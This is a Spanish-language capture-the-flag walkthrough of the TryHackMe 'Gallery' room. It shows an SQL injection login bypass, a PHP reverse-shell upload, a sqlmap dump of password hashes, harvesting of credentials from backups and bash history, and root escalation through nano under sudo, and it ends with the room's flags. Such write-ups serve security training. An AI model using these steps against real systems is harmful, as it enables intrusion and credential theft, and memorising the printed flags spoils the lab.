@@ -1,0 +1,139 @@
+TryHackMe
+Gallery
+
+nmap
+
+nmap -p- -sS -sC -sV --min-rate 5000 -vvv -n -Pn 10.10.12.82 -oN nmap
+
+• 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
+• 8080/tcp open http syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
+
+fuzz
+
+/gallery
+**"/gallery" nos redirige a "login.php"
+
+Encontramos un login donde aparentemente no tenemos muchas opciones, así que probaremos con XSS y SQLi.
+
+XSS:
+    • <script>alert(!)</script>: no hay respuesta
+
+SQLi:
+    • ': no hay respuesta
+    • 'or 1=1-- -: ingresamos
+
+Login vulnerable a SQL Injection.
+
+Dentro encontramos un panel de galería de imágenes. Buscando dentro, descubrimos que podemos subir archivos de imagen. Dado que la página es PHP, intentaremos subir un archivo PHP malicioso con una reverse shell.
+
+Al subir una reverse shell en formato PHP, se carga sin problemas y obtenemos la reverse shell a través del puerto 443.
+
+> nc -nlvp 443
+> whoami
+    • www-data
+
+> script /dev/null -c bash
+> (control z)
+> stty raw -echo; fg
+> reset xterm
+> export TERM=xterm
+> export SHELL=bash
+
+Ahora procederemos a escalar privilegios.
+
+> find / -perm -4000 2>/dev/null
+
+Como necesitamos una contraseña para poder realizar acciones, retrocedemos e intentamos extraer datos relevantes con SQLMap.
+
+Primero interceptamos la petición y la guardamos en un archivo ".txt" para que SQLMap pueda utilizar esos parámetros.
+
+> sqlmap -r sql.txt --dbs
+
+• available databases [2]:
+• gallery_db
+• information_schema
+
+> sqlmap -r sql.txt -D gallery_db --tables
+
+• album_list
+• images
+• system_info
+• users
+
+> sqlmap -r sql.txt -D gallery_db -T users --columns users
+
+--------------+--------------+
+| Column       | Type         |
++--------------+--------------+
+| type         | tinyint(1)   |
+| avatar       | text         |
+| date_added   | datetime     |
+| date_updated | datetime     |
+| firstname    | varchar(250) |
+| id           | int(50)      |
+| last_login   | datetime     |
+| lastname     | varchar(250) |
+| password     | text         |
+| username     | text         |
++--------------+--------------+
+
+> sqlmap -r sql.txt -D gallery_db -T users --columns users -C username,password --dump
+
++----------+----------------------------------+
+| username | password                         |
++----------+----------------------------------+
+| admin    | a228b12a08b6527e7978cbe5d914531c |
++----------+----------------------------------+
+
+De momento, esto no nos ha sido útil, así que seguiremos buscando archivos dentro de la máquina desde la reverse shell. Apuntaremos a algún backup, para esto utilizaremos la siguiente forma de búsqueda.
+
+> find / -type d 2>/dev/null | grep "backup"
+
+Encontramos lo siguiente:
+> /var/backups/mike_home_backup/documents
+
+Dentro de esa carpeta se aloja "accounts.txt".
+
+> cat accounts.txt
+• Spotify : mike@gmail.com:mycat666
+• Netflix : mike@gmail.com:123456789pass
+• TryHackme: mike:darkhacker123
+
+Las contraseñas no parecen ser útiles, al menos no para hacer "su mike", así que procedemos a buscar nuevamente. Una opción es buscar archivos ocultos. Encontramos archivos ocultos en la carpeta "mike_home_backup", el archivo se llama ".bash_history".
+
+> cat .bash_history
+
+• sudo -lb3stpassw0rdbr0xx
+
+Parece ser la contraseña de mike "b3stpassw0rdbr0xx".
+
+Efectivamente, al utilizarla como contraseña de mike "su mike", ahora somos mike.
+
+Ahora toca llegar a root. Tras repetir las secuencias de búsqueda y no encontrar nada, optamos por esta vez usar "sudo -l" para ver qué permisos de sudo tiene mike. Encontramos el siguiente script en bash.
+
+> (root) NOPASSWD: /bin/bash /opt/rootkit.sh
+
+Por lo tanto, podemos ejecutar rootkit.sh como root siendo mike.
+
+> cat rootkit.sh
+
+Al ver el código, vemos que si ejecutamos como root y leemos un archivo, podremos abrir "nano" como root. Al investigar en FTFobins vemos que "nano" puede tener una vulnerabilidad interna, si ejecutamos esto y somos root, podremos obtener una shell de root.
+
+> sudo /bin/bash /opt/rootkit.sh
+**pregunta que queremos hacer. Nosotros escribimos "read" para poder abrir nano como root**
+
+Ya tenemos nano como root.
+
+Ahora con el comando "control+r" abrimos una ventana donde inyectar código. Pegamos lo siguiente:
+
+> reset; sh 1>&0 2>&0
+
+> (control+x)
+
+Ya somos root.
+
+> cat user.txt
+THM{af05cd30bfed67849befd546ef}
+
+> cat root.txt
+THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}
